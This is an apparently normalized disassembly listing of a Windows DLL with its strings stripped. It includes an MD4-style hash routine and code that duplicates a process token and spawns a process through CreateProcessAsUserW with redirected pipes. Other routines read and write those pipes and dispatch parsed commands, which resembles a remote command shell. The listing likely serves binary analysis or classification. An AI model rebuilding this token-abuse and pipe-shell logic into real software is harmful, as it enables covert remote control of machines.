call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_1000315c
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ esi + 0x24 ]
mov [ ebp - 0x1 ] 0x0
cmp edi [ esi + 0x20 ]
ja r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x20 ]
mov [ ebp - 0x1 ] 0x1
mov ebx [ esi + 0x1c ]
lea eax [ edi * 4 + 0x28 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
test ebx ebx
je r-xdata
add [ esi + 0x24 ] 0xa
mov ecx edi
shl ecx 0x2
push ecx
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_100031bc
push esi
mov esi eax
mov ecx [ esi + 0x20 ]
xor al al
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
mov edx [ eax ]
dec ecx
mov [ esi + 0x20 ] ecx
shl ecx 0x2
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
mov [ edi ] edx
call [ memmove@IAT ]
add esp 0xc
call sub_1000a151
mov al 0x1
sub_100031ee
mov ecx [ esi + 0x20 ]
xor al al
cmp edx ecx
jae r-xdata
retn
mov eax [ esi + 0x1c ]
sub ecx edx
lea ecx [ ecx * 4 - 0x4 ]
lea eax [ eax + edx * 4 ]
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
dec [ esi + 0x20 ]
mov al 0x1
sub_1000321b
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003114
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000323b
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003138
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000325b
push edi
mov edi [ esi + 0x24 ]
cmp edi [ esi + 0x20 ]
jbe r-xdata
push ebx
mov ebx [ esi + 0x1c ]
lea eax [ edi * 4 + 0x28 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x1c ] eax
test eax eax
jne r-xdata
mov al 0x1
pop edi
retn
test ebx ebx
je r-xdata
xor al al
jmp r-xdata
add [ esi + 0x24 ] 0xa
mov al 0x1
mov ecx edi
shl ecx 0x2
push ecx
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
pop ebx
pop edi
retn
sub_100032a4
test edx edx
je r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_100032d5
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push ebx
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebx ebx
push ebx
push [ ebp + 0x8 ]
lea eax [ eax + esi + 0x18 ]
push eax
call [ memcpy@IAT ]
lea eax [ esi + 0x18 ]
push eax
mov ecx esi
call sub_10003370
lea eax [ ebx + 0x3f ]
add esp 0x10
cmp eax edi
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
sub edi ebx
add ebx [ ebp + 0x8 ]
push edi
lea eax [ eax + esi + 0x18 ]
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
lea eax [ eax + ecx - 0x3f ]
push eax
mov ecx esi
call sub_10003370
add [ ebp - 0x4 ] 0x40
add ebx 0x40
pop ecx
cmp [ ebp - 0x4 ] edi
jb r-xdata
sub_10003370
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x10
mov [ ebp - 0x4c ] ecx
add eax 0x2
lea edx [ ebp - 0x44 ]
pop esi
movzx edi [ eax + 0x1 ]
movzx ebx [ eax ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add eax 0x4
dec esi
jne r-xdata
mov edi [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
mov ebx esi
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x44 ]
mov ebx edi
add eax [ ecx ]
rol eax 0x3
and ebx eax
mov ecx eax
not ecx
and ecx esi
or ecx ebx
add ecx [ ebp - 0x40 ]
add ecx edx
rol ecx 0x7
mov edx ecx
not edx
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x3c ]
mov ebx ecx
add edx esi
rol edx 0xb
and ebx edx
mov esi edx
not esi
and esi eax
or esi ebx
add esi [ ebp - 0x38 ]
mov ebx edx
add esi edi
ror esi 0xd
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx esi
add edi eax
rol edi 0x3
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x30 ]
add eax ecx
rol eax 0x7
mov ecx eax
not ecx
and ecx esi
mov ebx eax
and ebx edi
or ecx ebx
add ecx [ ebp - 0x2c ]
mov ebx eax
add ecx edx
rol ecx 0xb
mov edx ecx
not edx
and edx edi
and ebx ecx
or edx ebx
add edx [ ebp - 0x28 ]
mov ebx ecx
add edx esi
ror edx 0xd
mov esi edx
not esi
and esi eax
and ebx edx
or esi ebx
add esi [ ebp - 0x24 ]
mov ebx edx
add esi edi
rol esi 0x3
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x20 ]
add edi eax
rol edi 0x7
mov ebx edi
mov eax edi
and eax esi
not ebx
and ebx edx
or ebx eax
add ebx [ ebp - 0x1c ]
add ebx ecx
rol ebx 0xb
mov ecx edi
and ecx ebx
mov eax ebx
not eax
and eax esi
or eax ecx
add eax [ ebp - 0x18 ]
add eax edx
ror eax 0xd
mov ecx eax
not ecx
and ecx edi
mov edx ebx
and edx eax
or ecx edx
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x48 ] eax
add ecx esi
rol ecx 0x3
and eax ecx
mov edx ecx
not edx
and edx ebx
or edx eax
add edx [ ebp - 0x10 ]
add edx edi
rol edx 0x7
mov eax edx
not eax
and eax [ ebp - 0x48 ]
mov esi edx
and esi ecx
or eax esi
add eax [ ebp - 0xc ]
mov edi edx
add eax ebx
rol eax 0xb
and edi eax
mov esi eax
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x8 ]
mov edi eax
add esi [ ebp - 0x48 ]
ror esi 0xd
or edi esi
mov [ ebp - 0x48 ] esi
and edi edx
mov esi eax
and esi [ ebp - 0x48 ]
or edi esi
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx + 0x5a827999 ]
mov edi [ ebp - 0x48 ]
rol ecx 0x3
mov esi edi
or esi ecx
and edi ecx
mov ebx esi
and ebx eax
or ebx edi
add ebx [ ebp - 0x34 ]
lea edx [ ebx + edx + 0x5a827999 ]
rol edx 0x5
and esi edx
or esi edi
add esi [ ebp - 0x24 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edx
mov edi eax
and edi ecx
or esi edi
add esi [ ebp - 0x14 ]
mov edi [ ebp - 0x48 ]
lea esi [ esi + edi + 0x5a827999 ]
rol esi 0xd
mov edi eax
or edi esi
and edi edx
mov ebx eax
and ebx esi
or edi ebx
add edi [ ebp - 0x40 ]
mov [ ebp - 0x48 ] esi
lea ecx [ edi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov edi [ ebp - 0x48 ]
mov ebx esi
and ebx ecx
and edi eax
or edi ebx
add edi [ ebp - 0x30 ]
lea edi [ edi + edx + 0x5a827999 ]
mov edx [ ebp - 0x48 ]
rol edi 0x5
and edx edi
or edx ebx
add edx [ ebp - 0x20 ]
lea eax [ edx + eax + 0x5a827999 ]
rol eax 0x9
mov edx eax
or edx ecx
and edx edi
mov ebx eax
and ebx ecx
or edx ebx
add edx [ ebp - 0x10 ]
mov ebx eax
lea edx [ edx + esi + 0x5a827999 ]
rol edx 0xd
mov esi eax
or esi edx
and esi edi
and ebx edx
or esi ebx
add esi [ ebp - 0x3c ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x2c ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x1c ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx eax
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
and ebx edx
mov esi eax
or esi edx
and esi edi
or esi ebx
add esi [ ebp - 0x38 ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x28 ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x18 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0x8 ]
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
mov esi edi
xor esi eax
xor esi edx
add esi [ ebp - 0x44 ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x24 ]
lea edi [ esi + edi + 0x6ed9eba1 ]
rol edi 0x9
mov esi edi
xor esi edx
xor esi ecx
add esi [ ebp - 0x34 ]
lea eax [ esi + eax + 0x6ed9eba1 ]
rol eax 0xb
mov esi edi
xor esi eax
mov ebx esi
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
rol edx 0xf
xor esi edx
add esi [ ebp - 0x3c ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x1c ]
lea esi [ esi + edi + 0x6ed9eba1 ]
rol esi 0x9
mov edi esi
xor edi edx
xor edi ecx
add edi [ ebp - 0x2c ]
lea edi [ edi + eax + 0x6ed9eba1 ]
rol edi 0xb
mov ebx esi
xor ebx edi
mov eax ebx
xor eax ecx
add eax [ ebp - 0xc ]
push 0x40
lea eax [ eax + edx + 0x6ed9eba1 ]
rol eax 0xf
xor ebx eax
add ebx [ ebp - 0x40 ]
mov edx edi
xor edx eax
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor edx ecx
add edx [ ebp - 0x20 ]
push 0x0
lea esi [ edx + esi + 0x6ed9eba1 ]
rol esi 0x9
mov edx esi
xor edx eax
xor edx ecx
add edx [ ebp - 0x30 ]
mov ebx esi
lea edi [ edx + edi + 0x6ed9eba1 ]
rol edi 0xb
xor ebx edi
mov edx ebx
xor edx ecx
add edx [ ebp - 0x10 ]
lea edx [ edx + eax + 0x6ed9eba1 ]
rol edx 0xf
xor ebx edx
add ebx [ ebp - 0x38 ]
mov eax edi
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor eax edx
xor eax ecx
add eax [ ebp - 0x18 ]
lea esi [ eax + esi + 0x6ed9eba1 ]
rol esi 0x9
mov eax esi
xor eax edx
xor eax ecx
add eax [ ebp - 0x28 ]
lea edi [ eax + edi + 0x6ed9eba1 ]
mov eax [ ebp - 0x4c ]
mov ebx [ eax ]
add ebx ecx
mov [ eax ] ebx
rol edi 0xb
mov ebx esi
xor ebx edi
xor ebx ecx
add ebx [ ebp - 0x8 ]
lea ecx [ ebx + edx + 0x6ed9eba1 ]
rol ecx 0xf
add ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add ecx edi
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0xc ]
add ecx esi
mov [ eax + 0xc ] ecx
lea eax [ ebp - 0x44 ]
push eax
call [ memset@IAT ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_1000380c
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
sub_1000384d
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000386e
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ wcsncpy@IAT ]
mov ebx eax
push 0x400
push [ ebp + 0x8 ]
lea esi [ ebx + 0x20 ]
push esi
mov [ ebx ] r--data
call edi
add esp 0xc
cmp [ esi ] 0x0
jne r-xdata
push 0x104
push [ ebp + 0xc ]
lea eax [ ebx + 0x820 ]
push eax
call edi
xor eax eax
mov [ ebx + 0xa26 ] ax
mov eax [ ebp + 0x10 ]
xor edi edi
push 0x10
mov [ ebx + 0xa28 ] eax
lea eax [ ebx + 0x8 ]
push edi
push eax
mov [ ebx + 0x4 ] edi
call [ memset@IAT ]
add esp 0x18
push [ ebx + 0xa28 ]
lea eax [ ebx + 0x820 ]
push eax
push esi
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x1c ] edi
call sub_10003961
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
push r--data
push esi
call [ wcscpy@IAT ]
pop ecx
pop ecx
sub_10003901
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push edi
push 0x0
push eax
call [ TerminateProcess@IAT ]
push [ esi + 0x8 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi + 0xc ]
call edi
push [ esi + 0x18 ]
call edi
push [ esi + 0x1c ]
call edi
pop edi
sub_10003938
push ebp
mov ebp esp
xor eax eax
push eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push eax
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_10003961
push ebp
mov ebp esp
sub esp 0x54
push esi
mov esi [ GetCurrentProcess@IAT ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
push 0xb
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
call sub_1000711a
and eax 0xffff0000
cmp eax 0x6000000
jb r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x2
push edi
push 0x2000000
push [ ebp + 0x10 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push edi
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x10 ] eax
cmp eax edi
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x10 ]
call [ ProcessIdToSessionId@IAT ]
test eax eax
je r-xdata
push edi
lea eax [ ebx + 0x18 ]
push edi
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x8 ]
push eax
call [ CreatePipe@IAT ]
push edi
push edi
lea ecx [ ebp - 0xc ]
lea eax [ ebx + 0x1c ]
push ecx
push eax
mov [ ebp - 0x10 ] eax
call [ CreatePipe@IAT ]
push 0x3
push 0x1
push edi
lea eax [ ebp - 0x8 ]
push eax
call esi
push eax
push [ ebp - 0x8 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
push 0x3
push 0x1
push edi
lea eax [ ebp - 0xc ]
push eax
call esi
push eax
push [ ebp - 0xc ]
call esi
push eax
call [ DuplicateHandle@IAT ]
mov esi [ memset@IAT ]
push 0x44
lea eax [ ebp - 0x54 ]
push edi
push eax
call esi
push 0x10
lea eax [ ebx + 0x8 ]
push edi
push eax
call esi
xor eax eax
add esp 0x18
mov [ ebp - 0x24 ] ax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
lea eax [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x54 ] 0x44
push edi
push edi
push 0x1
push edi
push edi
push [ ebp + 0x8 ]
mov [ ebp - 0x28 ] 0x101
push edi
push [ ebp - 0x4 ]
call [ CreateProcessAsUserW@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x4 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edi
lea ecx [ ebp + 0x10 ]
push ecx
push 0xb
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
jne r-xdata
push [ ebp - 0x8 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0xc ]
call esi
mov [ ebx + 0x4 ] edi
mov al 0x1
call [ GetLastError@IAT ]
push [ ebp - 0x8 ]
mov esi [ CloseHandle@IAT ]
mov [ ebx + 0x4 ] eax
call esi
push [ ebp - 0xc ]
call esi
mov eax [ ebp + 0x10 ]
push [ eax ]
call esi
mov eax [ ebp - 0x10 ]
push [ eax ]
call esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
push [ ebp - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x2
push edi
push 0x2000000
push [ ebp + 0x10 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
cmp eax edi
je r-xdata
xor al al
jmp r-xdata
call [ CloseHandle@IAT ]
push [ ebp + 0x10 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x4 ] edi
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0x10 ]
call eax
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] edi
jmp r-xdata
sub_10003b91
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003901
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_10003bb1
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea eax [ esi + 0xc ]
mov [ esi + 0x4 ] 0x5
mov [ esi ] r--data
push eax
mov [ esi + 0x8 ] r--data
call [ InitializeCriticalSection@IAT ]
xor ebx ebx
push 0x205f8
lea edi [ esi + 0x34 ]
push ebx
push edi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call [ memset@IAT ]
add esp 0xc
mov [ ebp - 0x4 ] 0xff
push r--data
push edi
call [ wcscpy@IAT ]
pop ecx
add edi 0x208
dec [ ebp - 0x4 ]
pop ecx
jne r-xdata
push 0x43
pop eax
pop edi
mov [ esi + 0x2062c ] ax
mov [ esi + 0x30 ] ebx
mov eax esi
pop ebx
leave
retn
sub_10003c26
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003c46
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_10003c46
push 0x4
mov eax sub_1001525e
call sub_10015102
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor eax eax
inc eax
mov [ ebp - 0x4 ] eax
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x10 ]
lea eax [ esi + 0x8 ]
call sub_100057a5
test al al
jne r-xdata
mov edx [ ecx ]
push eax
call [ edx ]
jmp r-xdata
push [ ebp - 0x10 ]
call [ free@IAT ]
pop ecx
lea ecx [ esi + 0x8 ]
call sub_10005781
mov [ esi ] r--data
call sub_1001516b
retn
sub_10003c9e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x30 ]
push edi
test ecx ecx
je r-xdata
and [ esi + 0x30 ] 0x0
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
lea ecx [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
call sub_100057a5
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
push 0x205f8
lea edi [ esi + 0x34 ]
push 0x0
push edi
call [ memset@IAT ]
add esp 0xc
mov ebx 0xff
push r--data
push edi
call [ wcscpy@IAT ]
pop ecx
add edi 0x208
dec ebx
pop ecx
jne r-xdata
and [ esi + 0x30 ] ebx
push 0x43
pop eax
pop edi
mov [ esi + 0x2062c ] ax
pop esi
pop ebx
leave
retn
sub_10003d15
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x30 ] edi
je r-xdata
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
push ebx
mov ebx [ WideCharToMultiByte@IAT ]
push esi
mov esi [ ebp + 0xc ]
push edi
push edi
push edi
push edi
shr esi 0x1
push esi
push [ ebp + 0x8 ]
push edi
push 0x1
call ebx
mov [ ebp - 0x4 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push edi
push [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
push eax
push esi
push [ ebp + 0x8 ]
push edi
push 0x1
call ebx
push r--data
push [ ebp + 0xc ]
call [ strcat@IAT ]
push [ ebp + 0xc ]
call [ strlen@IAT ]
mov ebx [ ebp - 0x8 ]
mov esi [ ebx + 0x30 ]
mov [ ebp + 0x8 ] eax
mov eax [ esi + 0x10 ]
add esp 0xc
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx edi
je r-xdata
push eax
call [ GetProcessVersion@IAT ]
test eax eax
je r-xdata
mov [ ebx + 0x30 ] edi
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ ebp + 0x8 ] edi
je r-xdata
xor eax eax
inc eax
pop edi
leave
retn 0x8
push [ ebp + 0xc ]
call [ LocalFree@IAT ]
pop esi
pop ebx
jmp r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ esi + 0x18 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] edi
jge r-xdata
sub_10003deb
push ebp
mov ebp esp
sub esp 0xc14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0xc14 ] eax
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
and [ ebp - 0xc10 ] 0x0
lea eax [ esi + 0x8 ]
lea ecx [ ebp - 0xc10 ]
call sub_100057a5
test al al
je r-xdata
push eax
call sub_10003938
test eax eax
je r-xdata
xor eax eax
push [ ebp - 0xc10 ]
mov esi [ wcslen@IAT ]
call esi
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
push edi
mov edi [ esi + 0x30 ]
push edi
call sub_10003938
test eax eax
je r-xdata
push [ ebp - 0xc10 ]
push eax
call [ wcscpy@IAT ]
push [ ebp - 0xc10 ]
call esi
mov ecx [ ebp - 0xc14 ]
lea eax [ eax + eax + 0x2 ]
mov [ ecx ] eax
xor eax eax
add esp 0xc
inc eax
jmp r-xdata
pop edi
push 0x0
lea eax [ ebp - 0xc10 ]
push eax
push 0x3ff
lea eax [ ebp - 0x404 ]
push eax
push [ edi + 0x1c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x8
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xc10 ]
test eax eax
jns r-xdata
and [ esi + 0x30 ] 0x0
push r--data
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
jle r-xdata
mov ecx esi
call sub_10004524
pop ecx
push 0x808
mov [ ebp + eax - 0x404 ] 0x0
lea eax [ ebp - 0xc0c ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x404
lea eax [ ebp - 0xc0c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call [ strlen@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push 0x0
push 0x1
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0xc0c ]
push eax
sub_10003f4f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001521d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa20 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa38 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
test ebx ebx
je r-xdata
xor eax eax
lea edi [ ebx + 0x2 ]
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
mov [ esp + 0x20 ] esi
test esi esi
je r-xdata
push edi
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
push ebx
push [ esp + 0x1c ]
push esi
call [ memcpy@IAT ]
mov ebx [ wcslen@IAT ]
add esp 0xc
push esi
call ebx
pop ecx
xor ecx ecx
mov [ esi + eax * 2 - 0x2 ] cx
jmp r-xdata
push esi
call ebx
cmp [ esi + eax * 2 - 0x2 ] 0xd
pop ecx
jne r-xdata
push esi
call ebx
cmp [ esi + eax * 2 - 0x2 ] 0xa
pop ecx
je r-xdata
and [ esp + 0x1c ] 0x0
lea eax [ esp + 0x1c ]
push eax
push esi
call [ CommandLineToArgvW@IAT ]
mov ebx eax
mov [ esp + 0x18 ] 0x57
test ebx ebx
je r-xdata
mov ecx [ esp + 0x14 ]
push r--data
call sub_10004524
pop ecx
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov esi [ _wcsicmp@IAT ]
push r--data
push [ ebx ]
call esi
mov edi [ LocalFree@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esp + 0xa38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xa20 ]
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn 0x8
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x1
mov ecx [ esp + 0x14 ]
jle r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
mov ecx [ esp + 0x14 ]
jl r-xdata
xor edx edx
mov edx [ ebx + 0x4 ]
jmp r-xdata
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] 0x2
jl r-xdata
push 0x0
push [ ebx + 0x4 ]
jmp r-xdata
push r--data
jmp r-xdata
call sub_1000737c
mov ecx [ esp + 0x14 ]
mov esi eax
push esi
push r--data
call sub_10004524
pop ecx
pop ecx
push esi
call edi
call sub_100047c9
push r--data
push [ ebx ]
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
